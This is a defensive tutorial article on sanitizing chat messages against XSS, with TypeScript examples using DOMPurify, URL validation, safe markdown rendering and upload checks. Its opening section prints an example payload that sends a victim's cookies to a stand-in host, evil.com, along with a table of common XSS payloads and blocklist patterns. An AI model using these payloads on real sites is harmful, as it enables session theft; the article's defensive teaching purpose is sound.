---
title: "Message Sanitization for Chat Applications"
description: ""
date: "2026-04-24"
author: "Saul Vo"
tags: ["chat","websocket","realtime","security"]
readingTime: "5 min"
order: 1
slug: "message-sanitization"
category: "web-chat-security"
---

# Message Sanitization for Chat Applications

## Mục lục
1. [XSS in Chat Applications](#1-xss-in-chat-applications)
2. [HTML Sanitization](#2-html-sanitization)
3. [URL Validation](#3-url-validation)
4. [Markdown Rendering](#4-markdown-rendering)
5. [File Upload Security](#5-file-upload-security)
6. [Real-time Sanitization](#6-real-time-sanitization)
7. [Implementation](#7-implementation)

---

## 1. XSS in Chat Applications

### Attack Vector

```
┌─────────────────────────────────────────────────────────────────────┐
│                    XSS in Chat Attack Flow                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. Attacker sends message:                                         │
│     <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">  │
│                                                                     │
│  2. Message stored in database (raw HTML)                          │
│                                                                     │
│  3. Victim views chat, message rendered:                            │
│     <img src=x onerror="...">  ← XSS executes                       │
│                                                                     │
│  4. Cookie stolen, session hijacked                                │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Common XSS Payloads in Chat

| Payload Type | Example | Risk |
|-------------|---------|------|
| Image onerror | `<img src=x onerror="alert(1)">` | Cookie theft |
| Script injection | `<script>fetch('evil.com')</script>` | Full XSS |
| SVG onload | `<svg onload="alert(1)">` | XSS |
| Body onload | `<body onload="alert(1)">` | XSS |
| Inline handlers | `<div onclick="alert(1)">` | Click XSS |
| URL javascript: | `javascript:alert(1)` | Link XSS |
| Data URL | `data:text/html,<script>alert(1)</script>` | XSS |

---

## 2. HTML Sanitization

### Using DOMPurify

```typescript
import DOMPurify from 'dompurify';

// Basic sanitization
function sanitizeMessage(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'code', 'pre'],
    ALLOWED_ATTR: [],
    KEEP_CONTENT: true
  });
}

// With links (safe attributes only)
function sanitizeMessageWithLinks(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['a', 'b', 'i', 'em', 'strong', 'u', 'code', 'pre', 'br', 'p'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
    ADD_ATTR: ['target', 'rel']
  });
}

// With links + safe target
function sanitizeMessageWithSafeLinks(html: string): string {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['a', 'b', 'i', 'em', 'strong', 'u', 'code', 'pre', 'br', 'p', 'span'],
    ALLOWED_ATTR: ['href', 'title', 'class']
  });

  // Add rel="noopener noreferrer" and target="_blank" to all links
  return clean.replace(
    /<a\s+href="([^"]+)"/g,
    '<a href="$1" target="_blank" rel="noopener noreferrer"'
  );
}
```

### Sanitization Levels

```typescript
enum SanitizationLevel {
  STRICT = 'strict',       // No HTML, plain text only
  BASIC = 'basic',         // Basic formatting only
  LINKS = 'links',         // Basic + safe links
  RICH = 'rich'            // Rich content (use carefully)
}

const SANITIZATION_CONFIG = {
  [SanitizationLevel.STRICT]: {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  },
  [SanitizationLevel.BASIC]: {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'code'],
    ALLOWED_ATTR: []
  },
  [SanitizationLevel.LINKS]: {
    ALLOWED_TAGS: ['a', 'b', 'i', 'em', 'strong', 'u', 'code', 'br', 'p'],
    ALLOWED_ATTR: ['href', 'title']
  },
  [SanitizationLevel.RICH]: {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'u', 'code', 'pre',
                   'blockquote', 'ul', 'ol', 'li', 'a', 'span', 'div', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'title', 'class'],
    ALLOW_DATA_ATTR: true
  }
};

function sanitizeByLevel(html: string, level: SanitizationLevel): string {
  const config = SANITIZATION_CONFIG[level];

  return DOMPurify.sanitize(html, {
    ...config,
    ADD_ATTR: ['target'],
    FORCE_BODY: false,
    ALLOW_UNKNOWN_PROTOCOLS: false
  });
}
```

### Preventing DOM Clobbering

```typescript
// DOMPurify with DOM clobbering protection
function sanitizeSafe(html: string): string {
  return DOMPurify.sanitize(html, {
    SANITIZE_DOM: true,         // Prevent DOM clobbering
    SANITIZE_NAMED_PROPS: true,  // Remove clobbering named props

    // Custom hook to remove dangerous properties
    HOOKS: {
      afterSanitizeAttributes: (node) => {
        // Remove id attributes that could clobber window
        if (node.hasAttribute && node.hasAttribute('id')) {
          const id = node.getAttribute('id');
          if (id && /^(config|global|window|data)$/i.test(id)) {
            node.removeAttribute('id');
          }
        }

        // Remove name attributes that could clobber form fields
        if (node.hasAttribute && node.hasAttribute('name')) {
          const name = node.getAttribute('name');
          if (name && /^(submit|reset|action|method)$/i.test(name)) {
            node.removeAttribute('name');
          }
        }
      }
    }
  });
}
```

---

## 3. URL Validation

### Safe URL Validation

```typescript
const ALLOWED_PROTOCOLS = ['http:', 'https:', 'mailto:'];
const BLOCKED_PROTOCOLS = ['javascript:', 'data:', 'vbscript:'];

function validateAndSanitizeUrl(input: string): string | null {
  try {
    // Prepend https if no protocol
    const url = new URL(input.startsWith('//') ? `https:${input}` : input);

    // Check protocol
    if (!ALLOWED_PROTOCOLS.includes(url.protocol)) {
      return null;
    }

    // Check for blocked protocols in href
    const href = url.href.toLowerCase();
    if (BLOCKED_PROTOCOLS.some(p => href.startsWith(p))) {
      return null;
    }

    // Validate hostname (basic check)
    if (url.hostname.includes('@')) {
      return null;  // Mailto in hostname
    }

    return url.href;
  } catch {
    return null;
  }
}

// Extract URLs from text and validate them
interface ExtractedLink {
  original: string;
  sanitized: string | null;
  position: { start: number; end: number };
}

function extractAndValidateUrls(text: string): ExtractedLink[] {
  const urlRegex = /(https?:\/\/[^\s<>"]+|www\.[^\s<>"]+)/gi;
  const links: ExtractedLink[] = [];

  let match;
  while ((match = urlRegex.exec(text)) !== null) {
    links.push({
      original: match[0],
      sanitized: validateAndSanitizeUrl(match[0]),
      position: {
        start: match.index,
        end: match.index + match[0].length
      }
    });
  }

  return links;
}

// Replace unsafe URLs with safe versions
function makeLinksSafe(text: string): string {
  const links = extractAndValidateUrls(text);

  let result = text;
  let offset = 0;

  for (const link of links) {
    if (!link.sanitized) {
      // Replace unsafe URL with its text content
      const safeVersion = `[Link removed]`;
      result = result.slice(0, link.position.start + offset) +
               safeVersion +
               result.slice(link.position.end + offset);
      offset += safeVersion.length - (link.position.end - link.position.start);
    } else if (link.sanitized !== link.original) {
      // Update if protocol was added
      const safeVersion = link.sanitized;
      result = result.slice(0, link.position.start + offset) +
               safeVersion +
               result.slice(link.position.end + offset);
      offset += safeVersion.length - (link.position.end - link.position.start);
    }
  }

  return result;
}
```

### Link Rendering Security

```typescript
// Safe link component for React
interface SafeLinkProps {
  href: string;
  children: React.ReactNode;
}

function SafeLink({ href, children }: SafeLinkProps) {
  const sanitizedHref = validateAndSanitizeUrl(href);

  if (!sanitizedHref) {
    // Don't render dangerous links
    return <span className="link-removed">[Link removed]</span>;
  }

  return (
    <a
      href={sanitizedHref}
      target="_blank"
      rel="noopener noreferrer"
      onClick={(e) => {
        // Log link click for monitoring
        console.log('External link clicked:', sanitizedHref);
      }}
    >
      {children}
    </a>
  );
}

// URL whitelist for internal links
const INTERNAL_PATTERNS = [
  /^https?:\/\/(www\.)?yourdomain\.com\//,
  /^https?:\/\/app\.yourdomain\.com\//,
  /^\/[a-zA-Z0-9-/]/  // Relative paths
];

function isInternalUrl(url: string): boolean {
  return INTERNAL_PATTERNS.some(pattern => pattern.test(url));
}

function renderLink(url: string, text: string): string {
  if (isInternalUrl(url)) {
    return `<a href="${url}">${text}</a>`;
  }

  const sanitized = validateAndSanitizeUrl(url);
  if (!sanitized) {
    return text;  // Remove unsafe links
  }

  return `<a href="${sanitized}" target="_blank" rel="noopener noreferrer">${text}</a>`;
}
```

---

## 4. Markdown Rendering

### Safe Markdown Libraries

```typescript
// Use marked with DOMPurify
import { marked } from 'marked';
import DOMPurify from 'dompurify';

// Configure marked for security
marked.setOptions({
  gfm: true,      // GitHub Flavored Markdown
  breaks: true    // Convert \n to <br>
});

// Custom renderer for safe HTML output
const renderer = new marked.Renderer();

// Override link rendering
renderer.link = (href, title, text) => {
  const sanitizedHref = validateAndSanitizeUrl(href || '');
  if (!sanitizedHref) {
    return text;  // Remove unsafe links
  }
  return `<a href="${sanitizedHref}" target="_blank" rel="noopener noreferrer" title="${title || ''}">${text}</a>`;
};

// Override image rendering
renderer.image = (href, title, text) => {
  const sanitizedHref = validateAndSanitizeUrl(href || '');
  if (!sanitizedHref) {
    return `[Image: ${text}]`;
  }
  return `<img src="${sanitizedHref}" alt="${text || ''}" title="${title || ''}">`;
};

// Override code blocks
renderer.code = (code, language) => {
  // Escape HTML in code blocks
  const escaped = code
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
  return `<pre><code class="language-${language || 'text'}">${escaped}</code></pre>`;
};

marked.use({ renderer });

function renderMarkdown(text: string): string {
  // First pass: convert markdown to HTML
  let html = marked.parse(text) as string;

  // Second pass: sanitize HTML
  html = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'u', 'code',
                   'pre', 'blockquote', 'ul', 'ol', 'li', 'a', 'img', 'h1', 'h2', 'h3', 'span'],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'target', 'rel'],
    ADD_ATTR: ['target', 'rel']
  });

  return html;
}
```

### Markdown Security Configuration

```typescript
// Block potentially dangerous markdown
const DANGEROUS_MARKDOWN_PATTERNS = [
  /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
  /javascript:/gi,
  /on\w+\s*=/gi,  // Event handlers
  /data:/gi
];

function sanitizeMarkdown(text: string): string {
  // Pre-sanitize: remove dangerous patterns before markdown processing
  for (const pattern of DANGEROUS_MARKDOWN_PATTERNS) {
    text = text.replace(pattern, '');
  }

  return text;
}

function renderMarkdownSafe(text: string): string {
  // Step 1: Pre-sanitize
  const preSanitized = sanitizeMarkdown(text);

  // Step 2: Convert markdown
  const html = marked.parse(preSanitized) as string;

  // Step 3: Post-sanitize HTML
  const safeHtml = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'u', 'code',
                   'pre', 'blockquote', 'ul', 'ol', 'li', 'a', 'h1', 'h2', 'h3', 'span'],
    ALLOWED_ATTR: ['href', 'title', 'class', 'target', 'rel'],
    ALLOW_DATA_ATTR: false
  });

  return safeHtml;
}
```

---

## 5. File Upload Security

### Image Sanitization

```typescript
import sharp from 'sharp';

interface SanitizedImage {
  buffer: Buffer;
  mimeType: string;
  width: number;
  height: number;
  hash: string;
}

async function sanitizeImageUpload(
  buffer: Buffer,
  maxWidth = 1920,
  maxHeight = 1920,
  maxSizeBytes = 5 * 1024 * 1024  // 5MB
): Promise<SanitizedImage> {
  // Step 1: Check file size
  if (buffer.length > maxSizeBytes) {
    throw new Error('File too large');
  }

  // Step 2: Get image metadata
  const metadata = await sharp(buffer).metadata();

  if (!metadata.width || !metadata.height) {
    throw new Error('Invalid image');
  }

  // Step 3: Resize if too large
  let processed = sharp(buffer);

  if (metadata.width > maxWidth || metadata.height > maxHeight) {
    processed = processed.resize(maxWidth, maxHeight, {
      fit: 'inside',
      withoutEnlargement: true
    });
  }

  // Step 4: Re-encode to strip metadata (EXIF, etc.)
  processed = processed
    .rotate()  // Auto-rotate based on EXIF, then strip EXIF
    .jpeg({ quality: 85 })
    .png({ compressionLevel: 9 });

  // Step 5: Convert to buffer
  const finalBuffer = await processed.toBuffer();

  // Step 6: Generate hash for deduplication
  const hash = crypto
    .createHash('sha256')
    .update(finalBuffer)
    .digest('hex');

  // Get final metadata
  const finalMetadata = await sharp(finalBuffer).metadata();

  return {
    buffer: finalBuffer,
    mimeType: 'image/jpeg',
    width: finalMetadata.width!,
    height: finalMetadata.height!,
    hash
  };
}

// Validate image using magic bytes
const IMAGE_SIGNATURES = {
  'jpeg': [0xFF, 0xD8, 0xFF],
  'png': [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A],
  'gif': [0x47, 0x49, 0x46, 0x38]
};

async function validateImageMagicBytes(buffer: Buffer): Promise<string> {
  for (const [type, signature] of Object.entries(IMAGE_SIGNATURES)) {
    if (buffer.slice(0, signature.length).equals(Buffer.from(signature))) {
      return type;
    }
  }
  throw new Error('Invalid image format');
}
```

### Attachments in Messages

```typescript
interface Attachment {
  id: string;
  type: 'image' | 'file' | 'audio';
  name: string;
  url: string;
  size: number;
  mimeType: string;
  hash: string;
  uploadedBy: string;
  uploadedAt: Date;
}

const ALLOWED_MIME_TYPES = {
  image: ['image/jpeg', 'image/png', 'image/gif', 'image/webp'],
  file: ['application/pdf', 'application/msword',
          'application/vnd.openxmlformats-officedocument.wordprocessingml.document'],
  audio: ['audio/mpeg', 'audio/ogg', 'audio/wav', 'audio/webm']
};

const MAX_FILE_SIZES = {
  image: 5 * 1024 * 1024,      // 5MB
  file: 25 * 1024 * 1024,      // 25MB
  audio: 10 * 1024 * 1024      // 10MB
};

function validateAttachment(file: {
  mimetype: string;
  size: number;
  originalname: string;
}): Attachment | null {
  // Determine type
  let type: 'image' | 'file' | 'audio' | null = null;

  for (const [t, mimes] of Object.entries(ALLOWED_MIME_TYPES)) {
    if (mimes.includes(file.mimetype)) {
      type = t as 'image' | 'file' | 'audio';
      break;
    }
  }

  if (!type) {
    return null;  // Invalid type
  }

  // Check size
  if (file.size > MAX_FILE_SIZES[type]) {
    throw new Error(`File too large: ${type} max is ${MAX_FILE_SIZES[type]}`);
  }

  // Sanitize filename
  const sanitizedName = file.originalname
    .replace(/[<>:"|?*]/g, '')
    .slice(0, 255);

  return {
    type,
    name: sanitizedName,
    size: file.size,
    mimeType: file.mimetype
  };
}
```

---

## 6. Real-time Sanitization

### Message Processing Pipeline

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Message Processing Pipeline                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────┐    ┌───────────┐    ┌────────────┐    ┌──────────┐  │
│  │  Input   │───▶│  Decode   │───▶│ Validate   │───▶│ Sanitize │  │
│  │ (raw)    │    │ (UTF-8)   │    │ (schema)   │    │ (HTML)   │  │
│  └─────────┘    └───────────┘    └────────────┘    └──────────┘  │
│                                                                 │
│       │                                                        │
│       │    ┌────────────┐    ┌────────────┐    ┌──────────┐  │
│       │───▶│  Enrich   │───▶│ Store      │───▶│ Deliver  │  │
│       │    │ (mentions │    │ (DB)       │    │ (realtime│  │
│       │    │  hashtags)│    │            │    │  push)   │  │
│       │    └────────────┘    └────────────┘    └──────────┘  │
│                                                                     │
│  Pipeline stages:                                                   │
│  1. Decode: Ensure valid UTF-8, reject invalid                     │
│  2. Validate: Check message schema, length, structure            │
│  3. Sanitize: Remove XSS vectors, validate URLs                  │
│  4. Enrich: Add metadata, resolve mentions                       │
│  5. Store: Persist to database                                     │
│  6. Deliver: Send to recipient(s) in real-time                    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Message Processor Class

```typescript
import DOMPurify from 'dompurify';

interface ProcessedMessage {
  id: string;
  senderId: string;
  recipientId?: string;
  content: string;
  mentions: string[];
  hashtags: string[];
  attachments: Attachment[];
  timestamp: number;
  sanitizedContent: string;
}

class MessageProcessor {
  private sanitizer: typeof DOMPurify;

  constructor() {
    this.sanitizer = DOMPurify;
  }

  async process(input: {
    senderId: string;
    recipientId?: string;
    content: string;
    attachments?: any[];
  }): Promise<ProcessedMessage> {
    // Step 1: Validate UTF-8
    const content = this.validateUtf8(input.content);

    // Step 2: Validate length
    if (content.length > 5000) {
      throw new Error('Message too long');
    }

    // Step 3: Extract metadata before sanitization
    const mentions = this.extractMentions(content);
    const hashtags = this.extractHashtags(content);

    // Step 4: Sanitize content
    const sanitizedContent = this.sanitizeContent(content);

    // Step 5: Process attachments
    const attachments = await this.processAttachments(input.attachments || []);

    // Step 6: Create processed message
    return {
      id: crypto.randomUUID(),
      senderId: input.senderId,
      recipientId: input.recipientId,
      content,
      sanitizedContent,
      mentions,
      hashtags,
      attachments,
      timestamp: Date.now()
    };
  }

  private validateUtf8(text: string): string {
    const decoder = new TextDecoder('utf-8', { fatal: true });
    const encoder = new TextEncoder();

    try {
      // Re-encode to ensure valid UTF-8
      const bytes = encoder.encode(text);
      return decoder.decode(bytes);
    } catch {
      throw new Error('Invalid UTF-8');
    }
  }

  private sanitizeContent(text: string): string {
    // First pass: handle URLs
    const withSafeUrls = this.makeUrlsSafe(text);

    // Second pass: sanitize HTML
    return this.sanitizer.sanitize(withSafeUrls, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'code', 'pre', 'br', 'p', 'a', 'span'],
      ALLOWED_ATTR: ['href', 'title', 'class', 'target', 'rel'],
      ALLOW_DATA_ATTR: false,
      ADD_ATTR: ['target', 'rel'],
      KEEP_CONTENT: true
    });
  }

  private makeUrlsSafe(text: string): string {
    const urlRegex = /(https?:\/\/[^\s<>"]+|www\.[^\s<>"]+)/gi;

    return text.replace(urlRegex, (url) => {
      const safe = this.validateAndSanitizeUrl(url);
      return safe || '';
    });
  }

  private validateAndSanitizeUrl(url: string): string | null {
    try {
      const parsed = new URL(url.startsWith('//') ? `https:${url}` : url);

      if (!['http:', 'https:'].includes(parsed.protocol)) {
        return null;
      }

      return parsed.href;
    } catch {
      return null;
    }
  }

  private extractMentions(text: string): string[] {
    const mentions = text.match(/@(\w+)/g) || [];
    return mentions.map(m => m.slice(1).toLowerCase());
  }

  private extractHashtags(text: string): string[] {
    const hashtags = text.match(/#(\w+)/g) || [];
    return hashtags.map(h => h.slice(1).toLowerCase());
  }

  private async processAttachments(attachments: any[]): Promise<Attachment[]> {
    const processed: Attachment[] = [];

    for (const att of attachments) {
      const validated = validateAttachment(att);
      if (validated) {
        processed.push(validated);
      }
    }

    return processed;
  }
}

export const messageProcessor = new MessageProcessor();
```

---

## 7. Implementation

### React Chat Message Component

```typescript
// components/ChatMessage.tsx
import { useMemo } from 'react';
import DOMPurify from 'dompurify';

interface ChatMessageProps {
  message: {
    senderId: string;
    content: string;
    sanitizedContent?: string;
    mentions?: string[];
    attachments?: Attachment[];
    timestamp: number;
  };
  currentUserId: string;
  onMentionClick?: (userId: string) => void;
}

export function ChatMessage({ message, currentUserId, onMentionClick }: ChatMessageProps) {
  const renderedContent = useMemo(() => {
    const rawContent = message.sanitizedContent || message.content;

    // Use pre-sanitized content if available, otherwise sanitize
    const html = message.sanitizedContent
      ? rawContent
      : DOMPurify.sanitize(rawContent, {
          ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'code', 'pre', 'br', 'p', 'a', 'span'],
          ALLOWED_ATTR: ['href', 'title', 'class', 'target', 'rel']
        });

    return html;
  }, [message.sanitizedContent, message.content]);

  return (
    <div className="chat-message">
      <div className="message-header">
        <span className="sender">{message.senderId}</span>
        <span className="timestamp">
          {new Date(message.timestamp).toLocaleTimeString()}
        </span>
      </div>

      <div
        className="message-content"
        dangerouslySetInnerHTML={{ __html: renderedContent }}
      />

      {message.attachments && message.attachments.length > 0 && (
        <div className="message-attachments">
          {message.attachments.map(att => (
            <AttachmentPreview key={att.id} attachment={att} />
          ))}
        </div>
      )}

      {message.mentions && message.mentions.length > 0 && (
        <div className="message-mentions">
          {message.mentions.map(mention => (
            <button
              key={mention}
              className={`mention ${mention === currentUserId ? 'self' : ''}`}
              onClick={() => onMentionClick?.(mention)}
            >
              @{mention}
            </button>
          ))}
        </div>
      )}
    </div>
  );
}

function AttachmentPreview({ attachment }: { attachment: Attachment }) {
  if (attachment.type === 'image') {
    return (
      <img
        src={attachment.url}
        alt={attachment.name}
        className="attachment-image"
        loading="lazy"
        onError={(e) => {
          (e.target as HTMLImageElement).src = '/broken-image.png';
        }}
      />
    );
  }

  return (
    <a
      href={attachment.url}
      download={attachment.name}
      className="attachment-file"
      rel="noopener noreferrer"
    >
      📎 {attachment.name}
    </a>
  );
}
```

### Server-side Message Handler

```typescript
// routes/chat.ts
import { messageProcessor } from './message-processor';

app.post('/api/messages', authenticateToken, async (req, res) => {
  try {
    const { recipientId, content, attachments } = req.body;

    // Process message through sanitization pipeline
    const processed = await messageProcessor.process({
      senderId: req.user.id,
      recipientId,
      content,
      attachments
    });

    // Store message
    const saved = await db.createMessage(processed);

    // Deliver to recipient via WebSocket
    const recipientWs = connectionManager.getConnection(recipientId);
    if (recipientWs) {
      recipientWs.send(JSON.stringify({
        type: 'chat_message',
        message: saved
      }));
    }

    // Return processed message
    res.json({
      id: saved.id,
      sanitizedContent: saved.sanitizedContent,
      timestamp: saved.timestamp
    });
  } catch (error) {
    console.error('Message processing error:', error);
    res.status(400).json({ error: error.message });
  }
});
```

---

## OWASP References

- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOM XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
